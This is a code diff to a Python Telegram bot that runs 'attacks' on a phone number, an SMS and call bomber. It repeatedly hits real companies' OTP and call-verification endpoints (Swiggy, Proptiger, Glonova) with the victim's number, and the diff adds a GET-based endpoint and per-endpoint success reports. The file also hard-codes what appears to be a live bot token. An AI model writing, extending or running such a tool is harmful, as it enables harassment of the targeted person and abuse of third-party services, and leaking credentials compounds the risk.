@@ -26,19 +26,27 @@ TOKEN = "7554221154:AAF6slUuJGJ7tXuIDhEZP8LIOB5trSTz0gU"
 active_attacks = {}
 message_count = {}
 
-# Working APIs
+# Working APIs including Glonova
 APIS = [
     {
         "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
         "payload": {"mobile": ""},
         "headers": {"Content-Type": "application/json"},
-        "name": "Swiggy"
+        "name": "Swiggy",
+        "method": "POST"
     },
     {
         "url": "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call",
         "payload": {"contactNumber": "", "domainId": "2"},
         "headers": {"Content-Type": "application/json"},
-        "name": "Proptiger"
+        "name": "Proptiger",
+        "method": "POST"
+    },
+    {
+        "url": "https://glonova.in/",
+        "params": {"mobile": ""},
+        "name": "Glonova",
+        "method": "GET"
     }
 ]
 
@@ -102,7 +110,13 @@ async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, phone
     # Start attack in background
     asyncio.create_task(run_attack_async(update, context, phone_number, user_id))
     
-    await update.message.reply_text(f"🚀 Attack started on {phone_number}")
+    # Show active APIs
+    api_list = "\n".join([f"• {api['name']}" for api in APIS])
+    await update.message.reply_text(
+        f"🚀 Attack started on {phone_number}\n\n"
+        f"📡 Active APIs:\n{api_list}\n\n"
+        f"🛑 Use /stop to end attack"
+    )
 
 async def run_attack_async(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str, user_id: int):
     """Run attack in an async task"""
@@ -120,15 +134,23 @@ async def run_attack_async(update: Update, context: ContextTypes.DEFAULT_TYPE, p
                 ]
                 
                 # Process results
-                success = 0
+                results = []
                 for future in concurrent.futures.as_completed(futures):
                     try:
-                        if future.result():
-                            success += 1
+                        results.append(future.result())
                     except Exception as e:
                         logger.error(f"API error: {e}")
+                        results.append({"name": "Unknown", "success": False})
                 
+                # Count successes
+                success = sum(1 for r in results if r['success'])
                 message_count[user_id] += success
+                
+                # Detailed results
+                details = "\n".join([
+                    f"{'✅' if r['success'] else '❌'} {r['name']}"
+                    for r in results
+                ])
                 
                 # Send update
                 progress = min(100, message_count[user_id] * 10)
@@ -138,9 +160,10 @@ async def run_attack_async(update: Update, context: ContextTypes.DEFAULT_TYPE, p
                     chat_id=update.effective_chat.id,
                     text=(
                         f"📊 Round complete\n"
-                        f"✅ Success: {success}\n"
+                        f"✅ Success: {success}/{len(APIS)}\n"
                         f"📨 Total: {message_count[user_id]}\n"
-                        f"{progress_bar} {progress}%"
+                        f"{progress_bar} {progress}%\n\n"
+                        f"{details}"
                     )
                 )
                 
@@ -159,23 +182,44 @@ async def run_attack_async(update: Update, context: ContextTypes.DEFAULT_TYPE, p
             text=f"⚠️ Attack error: {str(e)}"
         )
 
-def send_api_request(api: dict, phone_number: str) -> bool:
+def send_api_request(api: dict, phone_number: str) -> dict:
     """Synchronous API request function"""
     try:
-        payload = api["payload"].copy()
-        for key in payload:
-            if "mobile" in key.lower() or "phone" in key.lower():
-                payload[key] = phone_number
+        if api['method'] == "POST":
+            payload = api.get("payload", {}).copy()
+            for key in payload:
+                if "mobile" in key.lower() or "phone" in key.lower():
+                    payload[key] = phone_number
+            
+            response = requests.post(
+                api["url"],
+                json=payload,
+                headers=api.get("headers", {}),
+                timeout=10
+            )
+        else:  # GET request
+            params = api.get("params", {}).copy()
+            for key in params:
+                if "mobile" in key.lower() or "phone" in key.lower():
+                    params[key] = phone_number
+            
+            response = requests.get(
+                api["url"],
+                params=params,
+                timeout=10
+            )
         
-        response = requests.post(
-            api["url"],
-            json=payload,
-            headers=api.get("headers", {}),
-            timeout=10
-        )
-        return response.status_code == 200
-    except Exception:
-        return False
+        return {
+            "name": api['name'],
+            "success": response.status_code == 200,
+            "status": response.status_code
+        }
+    except Exception as e:
+        return {
+            "name": api['name'],
+            "success": False,
+            "error": str(e)
+        }
 
 async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Stop the attack"""
@@ -184,7 +228,7 @@ async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         del active_attacks[user_id]
         total = message_count.get(user_id, 0)
         del message_count[user_id]
-        await update.message.reply_text(f"🛑 Attack stopped\nTotal messages: {total}")
+        await update.message.reply_text(f"🛑 Attack stopped\nTotal messages sent: {total}")
     else:
         await update.message.reply_text("ℹ️ No active attack to stop")
 
@@ -199,6 +243,7 @@ def main():
     application.add_handler(CallbackQueryHandler(button))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
+    # Run the bot
     application.run_polling()
 
 if __name__ == '__main__':
